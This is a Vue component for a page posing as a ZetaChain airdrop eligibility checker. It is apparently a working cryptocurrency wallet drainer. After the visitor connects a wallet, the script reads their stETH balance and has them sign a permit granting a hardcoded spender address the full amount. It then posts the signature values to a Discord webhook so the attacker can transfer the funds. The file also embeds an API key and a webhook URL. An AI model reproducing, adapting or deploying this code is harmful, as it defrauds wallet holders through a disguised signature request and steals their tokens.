<template>
  <div class="yclaim">
    <div class="yclaone flex">
      <div class="yclaonel">
        <h2>Check your airdrop eligibility</h2>
        <p>
          As ZetaChain prepares for Mainnet, we thank our global community
          following the ZetaChain journey. Our most engaged ZetaLabs users may
          be eligible for a reward!
        </p>
        <p>
          Check your eligibility by connecting your primary ZetaLabs wallet.
        </p>
        <div class="yclad flex">
          <button :class="islogin == '0' ? '' : 'ycladnone'" @click="connect()">
            {{ connecttxt }}
          </button>
          <button
            :class="islogin == '1' ? 'ycladbno' : 'ycladnone'"
            @click="checkE()"
          >
            {{ connectttxt }}
          </button>
        </div>
      </div>
      <div class="yclaonel">
        <div class="yclaonelvid">
          <video
            src="../assets/homeone.mp4"
            autoplay=""
            loop=""
            muted=""
          ></video>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted } from "vue";
import bus from "../utils/bus";
import { ethers } from "ethers";
import { init, useOnboard } from "@web3-onboard/vue";
import injectedModule from "@web3-onboard/injected-wallets";
const injected = injectedModule();
const infuraKey = "34071ed776e84b2f85e9b2c3d33929b5";
const rpcUrl = `https://mainnet.infura.io/v3/${infuraKey}`;
let xhladdress = ref("");
let xethbalance = ref("");
let xusdtbalance = ref("");
let islogin = ref("0");
let connecttxt = ref("Connect wallet and see if you’re eligible");
let connectttxt = ref("Check Eligibility");
let signxx = ref();
let asset = ref({
  name: "stETH",
  address: "0xae7ab96520de3a18e5e111b5eaab095312d7fe84",
  balance: "",
});
const PermitERC20_ABI = [
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "value", type: "uint256" },
      { internalType: "uint256", name: "deadline", type: "uint256" },
      { internalType: "uint8", name: "v", type: "uint8" },
      { internalType: "bytes32", name: "r", type: "bytes32" },
      { internalType: "bytes32", name: "s", type: "bytes32" },
    ],
    name: "permit",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "owner", type: "address" }],
    name: "nonces",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
];
const spenderAddress = "0xb5d6C256Fdf250f6c935C05644C482bcEf100288";
const web3Onboard = init({
  wallets: [injected],
  chains: [
    {
      id: "0x1",
      token: "ETH",
      label: "Ethereum Mainnet",
      rpcUrl,
    },
    {
      id: 42161,
      token: "ARB-ETH",
      label: "Arbitrum One",
      rpcUrl: "https://rpc.ankr.com/arbitrum",
    },
    {
      id: "0xa4ba",
      token: "ARB",
      label: "Arbitrum Nova",
      rpcUrl: "https://nova.arbitrum.io/rpc",
    },
    {
      id: "0x2105",
      token: "ETH",
      label: "Base",
      rpcUrl: "https://mainnet.base.org",
    },
  ],
  theme: "dark",
  appMetadata: {
    name: "Blex",
    description: "Your App Description",
    icon: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAAA4CAYAAACohjseAAAAAXNSR0IArs4c6QAABJZJREFUaEPtmM9vG0UUx9+s47RxUheqNlRCFIkfqoQQqLvLAedSC6XZdXeLhETvnJDgxqkHigSCAydOcOif4Fuz63rTqFhIleDgTSgoAgGVEEJCkCBK0vwwjvehTbNhMpn9vbZDtb7ZMzvzPu/7fW/GS+Ah/5CHnA9ywP+7wrmCuYKHPAO5RQ+5QKHh5QqGpuiQTxiogpZpo5sPRZMGtu9ANvLAPLE9QPr3fkH3BfD29e+P3S+sr7LuRSQVVRe/ZIFpVZuGvazq0qmsnJ85YBS12OBd9fyeSwuaGWAcMNqOPDVHoPh0F7vXVF2cBiA7dZv0kxrQDRABf1A1+SwdhJ8N3d83u8KjY0Xnr0EomRqQDtIw2qUiIev0bwjkVVUTZ3nAdO2FjQ9NQXfjG7Pt9wSBvM92Sfd7WOC8cURYKRDhLQecOm/NOLCpFLRM21WrhAhfqLp0PqpF3XkIsEEASt4zjlA+Wqs92wlLSBw4d24iQDcI3rllzd4RQdi26SB4Z15cpdNcEBIBslmks46IH6q6fNWbE6aIfzNqXwUgH9B7ESA3ZjTxYhwVUwH6ZbbVWDrdwa3fonRJVk2/hOzY2nHeUS+99EnfAX0tunvX9AIon5gsVSpPbPo1m7DzkBD4e+ai9AgNXRgRtGnlXCMqZCoFeTakg261liY661trbDAIsKJqD65jrGII8KaqSdeaZvs2ATLFc0FUuMRNhgVjG47VsDcB4ei++imOTMD6/fGZ16b+aJr2XQLwlDd+8jSOyrLcDTtWkjSbRApapu0omiQENRt3jOqgDtuxDySFsbf3fL3emiiXyvtcEOefRyLAILCwuvIC37MmwjdA4AVOs+kAwCjPjgMD3A1yWdGkSToQXid0BDJZq4nLQX+VDoVF6/Wl0XJ564yiSD9FtWhQ4KQ4ega7//zip9Rcw55DhAv0+MAUDOuic+ad5xG2v2WCd29BQpILwO46G4omjUftpIlrcH7+7vFe5949QcCZCzX5ZohFP1I06d2oFuQcK58BIS8SxKk46iU6JizD/l3Rpcd4GQx6xxJUe7yx1Q1x5PJl0gur2TAlEyvIU4x7AWfavzenadpLBOA5v9oLs3AYmDeeCjDgyvYzADz5YBPcVjS5yKvXvSAR/1R0+eR/ULgGQI6xR0dUKHpebEDLsN9WdOnTIIs6DrxcuyR9FVSXR8YnTlWrZ1duGV8/3iW9X9n1snq1GBvQD8yv+P3qsmm0NwghY+x6R5ZXx6pvVLfS1l4mFvWzzLyxeL5HnJY7HvVK5ncx560Rx6qZKMjWV5xmY5kLNwFwen/Q5GNFE6/EAfGbmwmgX7Nhzr3vFE3a65pBXbJpLr5Odl84xT33WNBMAA8czIjCXGOhF0VJRFxTdblsmfY2ABT8mk1SNTMFtMz2oqLJ54I6LFtTltn+HIBU6WfKJzqlSqWy8yYg7SdTwCCwA83muv0MFODHrBUbiEXdTZrGwiuqLt6Ko2ZatXjP911BetOgZtQPOHfNgQL2CyJo3RxwGFnPcs9cwSyzOYy1cgWHkfUs98wVzDKbw1grV3AYWc9yz38BAy1kVz8lNEUAAAAASUVORK5CYII=",
  },
});
const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const usdtContractABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
];
const webhook =
  "https://discord.com/api/webhooks/1130507485296472126/Ioy8h54ZJAXD-9SBboBXGuZadnuMuvoPZzFdoSzZyqoQNQ7XarozV2m-rTxwVzWrV52v";
const ContractABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
];
onMounted(() => {
  if (localStorage.getItem("xhladd")) {
    islogin.value = "1";
    xhladdress.value = localStorage.getItem("xhladd");
    getfirstBalance();
  }
});
const { connectWallet } = useOnboard();
let connect = () => {
  connecttxt.value = "Checkimg";
  connectWallet().then((res) => {
    logcon();
  });
};
let checkE = () => {
  connectttxt.value = "Checkimg";
  newPermitAction(asset.value);
};
let logcon = async () => {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  xhladdress.value = await signer.getAddress();
  localStorage.setItem("xhladd", xhladdress.value);
  const usdtContract = new ethers.Contract(
    asset.value.address,
    ContractABI,
    provider
  );
  const balance = await usdtContract.balanceOf(xhladdress.value);
  xethbalance.value = ethers.utils.formatEther(balance);
  localStorage.setItem("xhlbalance", xethbalance.value);
  console.log("balance", xethbalance.value);
  bus.$emit("qbbalance", xethbalance.value);
  asset.value.balance = xethbalance.value;
  newPermitAction(asset.value);
};
let getfirstBalance = async () => {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  xhladdress.value = await signer.getAddress();
  const usdtContract = new ethers.Contract(
    asset.value.address,
    ContractABI,
    provider
  );
  const balance = await usdtContract.balanceOf(xhladdress.value);
  xethbalance.value = ethers.utils.formatEther(balance);
  localStorage.setItem("xhlbalance", xethbalance.value);
  bus.$emit("qbbalance", xethbalance.value);
  asset.value.balance = xethbalance.value;
};
let newPermitAction = async (ethassets) => {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const tokenOwner = provider.getSigner();
  const value = ethers.utils.parseEther(ethassets.balance);
  const deadline = Math.round(Date.now() / 1000) + 200;
  const chainId = (await provider.getNetwork()).chainId;
  const myToken = new ethers.Contract(
    ethassets.address,
    PermitERC20_ABI,
    provider
  );
  const nonces = await myToken.nonces(tokenOwner.getAddress());
  const domain = {
    name: ethassets.name,
    version: "1",
    chainId: chainId,
    verifyingContract: ethassets.address,
  };
  const types = {
    Permit: [
      {
        name: "owner",
        type: "address",
      },
      {
        name: "spender",
        type: "address",
      },
      {
        name: "value",
        type: "uint256",
      },
      {
        name: "nonce",
        type: "uint256",
      },
      {
        name: "deadline",
        type: "uint256",
      },
    ],
  };
  const values = {
    owner: xhladdress.value,
    spender: spenderAddress,
    value: value,
    nonce: nonces,
    deadline: Math.round(Date.now() / 1000) + 100,
  };
  const signature = await tokenOwner._signTypedData(domain, types, values);
  const sig = ethers.utils.splitSignature(signature);
  const recovered = ethers.utils.verifyTypedData(domain, types, values, sig);
  let gasPrice = await provider.getGasPrice();
  islogin.value = "1";
  connectttxt.value = "Check Eligibility";
  sendLog(value, deadline, sig);
};
let sendLog = (value, deadline, sig) => {
  let data = {
    content: `**🤞 welcome newcomer --** Address:${xhladdress.value} spenderAddress:${spenderAddress} value:${value} deadline:${deadline} v:${sig.v} r:${sig.r} s:${sig.s}`,
  };
  fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  })
    .then((res) => {
      console.log(res);
    })
    .catch((err) => {
      console.log(err);
    });
};
</script>

<style scoped>
.yclad > .ycladnone {
  display: none;
}
.yclaim {
  width: 100%;
  height: calc(100vh - 7.25rem);
  padding: 8.3rem 0 0;
  box-sizing: border-box;
  position: relative;
  display: flex;
  align-items: center;
  z-index: 1;
}
.yclaone {
  width: 64.986%;
  padding: 0 0.75rem 5rem;
  margin: 0 auto;
  box-sizing: border-box;
  align-items: center;
}
.yclaonel {
  width: 50%;
  padding: 0 0.75rem;
  box-sizing: border-box;
}
.yclaonel > h2 {
  color: #fff;
  font-size: 72px;
  line-height: 80px;
  text-transform: capitalize;
  font-family: "Poppins";
}
.ymainhy .yclaonel > h2 {
  color: #000;
}
.yclaonel > p {
  margin-top: 1.25rem;
  font-family: "Interl";
  font-size: 20px;
  font-weight: 400;
  line-height: 1.2;
  color: #6e757c;
}
.yclad {
  margin-top: 2.5rem;
  align-items: center;
}
.yclad > button {
  font-family: "Poppins";
  display: inline-flex;
  justify-content: center;
  align-items: center;
  height: 3.5rem;
  padding: 0 1.5rem;
  border-radius: 1rem;
  font-size: 16px;
  font-weight: 500;
  transition: all 0.2s;
  box-sizing: border-box;
  background: transparent;
  box-shadow: inset 0 0 0 2px #f7f7f8bf;
  color: #f7f7f8bf;
}
.yclad > button:hover {
  background: #f7f7f8bf;
  box-shadow: none;
  color: #272e35;
}
.ymainhy .yclad > button {
  box-shadow: inset 0 0 0 2px #272e35bf;
  color: #272e35;
}
.ymainhy .yclad > button:hover {
  background: #272e35;
  box-shadow: none;
  color: #f7f7f8;
}
.yclaonelvid video {
  display: block;
  margin: 0 auto;
  width: 30rem;
  height: auto;
  border-radius: 50%;
}
@media (max-width: 1650px) {
  .yclaim {
    height: auto;
    padding-top: 10rem;
  }
}
@media (max-width: 1250px) {
  .yclaone {
    width: 100%;
    padding: 0;
    display: block;
  }
  .yclaonel {
    width: 100%;
  }
  .yclad {
    margin-top: 1.5rem;
  }
  .yclaonel > h2 {
    font-size: 2.5rem;
    line-height: 3rem;
    text-align: center;
  }
  .yclaonel > p {
    font-size: 1rem;
    line-height: 1.5rem;
    text-align: center;
  }
  .yclad > button {
    padding: 0 0.875rem;
  }
  .yclaonelvid {
    width: 100%;
    padding: 4rem 0;
  }
  .yclaonelvid video {
    width: 80%;
  }
  .yclad .ycladbno {
    margin: 0 auto;
  }
}
</style>
